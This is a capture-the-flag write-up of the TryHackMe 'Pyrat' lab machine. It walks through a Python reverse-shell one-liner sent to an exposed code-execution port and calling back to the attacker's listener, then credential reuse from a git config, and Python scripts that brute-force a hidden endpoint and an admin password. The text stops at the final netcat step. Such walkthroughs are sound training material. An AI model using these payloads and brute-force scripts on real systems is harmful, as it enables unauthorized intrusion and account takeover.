[Pyrat](https://tryhackme.com/r/room/pyrat) machine on [TryHackMe](https://tryhackme.com/) is a boot2root machine which exposes an HTTP server on a concrete port
By crafting a specific payload, we gain initial shell access on the target machine. While exploring the file structure, we find a repository with credentials. Digging deeper reveals important details about an older application version. Using custom scripts and brute-forcing techniques, we eventually discover a critical endpoint. From there, we retrieve an admin password, ultimately granting us root access to the system.

## Initial foothold

From port scan we see there is a ``SimpleHTTP`` server on port 8000. When opening it on a browser it just shows a blank page with a text saying 'Try a more basic connection!'

![alt text](../assets/img/posts/2024-11-13-thm-writeup-pyrat/image.png)

What is a more basic connection? Maybe if we try netcat we can get something out of that?

![alt text](../assets/img/posts/2024-11-13-thm-writeup-pyrat/image-1.png)

Success! By testing various inputs against the server, we can deduce that it executes any Python code we send to it.
With this knowledge, we can attempt to craft a reverse shell using Python.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nc 10.10.43.86 8000
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.143.15",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")   
```

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nc -vnlp 4444
listening on [any] 4444 ...
connect to [10.10.143.15] from (UNKNOWN) [10.10.43.86] 47294
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python3 -c "import pty;pty.spawn('/bin/bash');"
python3 -c "import pty;pty.spawn('/bin/bash');"
www-data@Pyrat:~$ export TERM=xterm
export TERM=xterm
www-data@Pyrat:~$ 

```

We've established a stable reverse shell and gained an initial foothold on the machine! However, we're currently just a low-privilege user, so we need to keep searching for another low-hanging fruit.

After spending some time searching manually, I decided to run linpeas. First, we transfer it to the victim machine.

While reviewing the results from linpeas, we notice a user named `think`.

![alt text](../assets/img/posts/2024-11-13-thm-writeup-pyrat/image-2.png)

But also a Git directory under /opt/dev catches my attention:

![alt text](../assets/img/posts/2024-11-13-thm-writeup-pyrat/image-3.png)

Upon checking the .git contents, we find a ``config`` file that, to my surprise, reveals a password for the ``think`` user

```bash
www-data@Pyrat:/opt/dev/.git$ ls -la
ls -la
total 52
drwxrwxr-x 8 think think 4096 Jun 21  2023 .
drwxrwxr-x 3 think think 4096 Jun 21  2023 ..

cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = ****[REDACTED]****

```

So... will it work for switching to `think` user? Let's try if that user has a reused password.

```bash
www-data@Pyrat:/opt/dev/.git$ su - think
su - think
Password:

think@Pyrat:~$ whoami
whoami
think
think@Pyrat:~$ cat user.txt
cat user.txt
9******************************5
```

Yes it worked! Now we are into `think` user!

## Privilege escalation

From this point, I couldnâ€™t find a way forward until I decided to revisit the repository and check its status.
Then I saw deleted file `pyrat.py.old`

```bash
think@Pyrat:/opt/dev$ git status
git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
```

It is possible to restore file which are kept on this status, so did that and checked code on file:

```bash
think@Pyrat:/opt/dev$ git restore pyrat.py.old
git restore pyrat.py.old

think@Pyrat:/opt/dev$ cat pyrat.py.old
cat pyrat.py.old
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
...............................................
```

According to the code above, if an unknown endpoint is provided in ``data``, it performs an action on ``get_this_endpoint``. 
If ``shell`` is provided, it simply opens a shell; otherwise, it executes the given Python code:

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nc 10.10.43.86 8000
shell
$ whoami
whoami
www-data
^C
                                                                                                                                 
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nc 10.10.43.86 8000
print(1+1)
2
```

Now things get a bit trickier... we need to try guessing the endpoint.
After observing that sending unkown data to the endpoint gives `X is not defined` or empty response we'll code and use the following Python script to brute-force and find something different returned on the response.

```python title="find_endpoint.py"
#!/usr/bin/env python3

import socket
import time
import sys

def create_socket_connection(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return sock
    except socket.error as e:
        print(f"Error creating socket connection: {e}")
        return None

def brute_force(sock, wordlist):
	for word in wordlist:
		print("Trying " + word + "...")
		sock.send(word.encode())
		data = sock.recv(512).decode("utf-8")
		if len(data.strip()) > 0 and not "is not defined" in data:
			print("==========> FOUND! -> " + word)
		
		sock.close()
		time.sleep(1)
		sock = create_socket_connection(host, port)
	
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python find_endpoint.py <HOST> <PORT> <WORDLIST_PATH>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    wordlist_path = sys.argv[3]
    
    wordlist = open(wordlist_path, 'r').read().splitlines()
    sock = create_socket_connection(host, port)
    brute_force(sock, wordlist)
```

Executing the script will reveal `admin` endpoint

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# python3 find_endpoint.py 10.10.43.86 8000 "/usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt"
Trying 0...
...
Trying admin...
==========> FOUND! -> admin
Trying admins...
...
Trying shell...
==========> FOUND! -> shell
Trying show...
Trying sign...
```

Trying the admin endpoint prompts for a passwordâ€”one that we donâ€™t know.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# nc 10.10.43.86 8000
admin
Password:

```

Therefore, we need to adjust the previous Python script and attempt to fuzz for valid password(and hope) that it works.
After some trial and error, I noticed that after every three attempts, we need to send the admin endpoint again to continue without creating a new socket each time. I incorporated this into the script accordingly

```python title="find_endpoint.py"
#!/usr/bin/env python3

import socket
import time
import sys

def create_socket_connection(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return sock
    except socket.error as e:
        print(f"Error creating socket connection: {e}")
        return None

def brute_force(sock, wordlist):
	retries = 0
	sock.send("admin".encode())
	time.sleep(1)
	for word in wordlist:
		sock.send(word.encode())
		data = sock.recv(512).decode("utf-8")
		print("Trying " + word + ".... Got => " + data.replace("\n", ''))
		retries = retries + 1
		if retries == 3:
			sock.send("admin".encode())
			retries = 0
		time.sleep(1)
		
	sock.close()
	
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python find_endpoint.py <HOST> <PORT> <WORDLIST_PATH>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    wordlist_path = sys.argv[3]
    
    wordlist = open(wordlist_path, 'r').read().splitlines()
    sock = create_socket_connection(host, port)
    brute_force(sock, wordlist)
```

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# python3 find_endpoint.py 10.10.43.86 8000 "/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"

```

It appears that a successful password attempt triggers a Welcome admin message on the following try, confirming the previous password was correct.

Manually inputting the admin endpoint with the discovered password grants us a root shell, allowing us to retrieve the flag

````bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# nc 10.10.43.86 8000
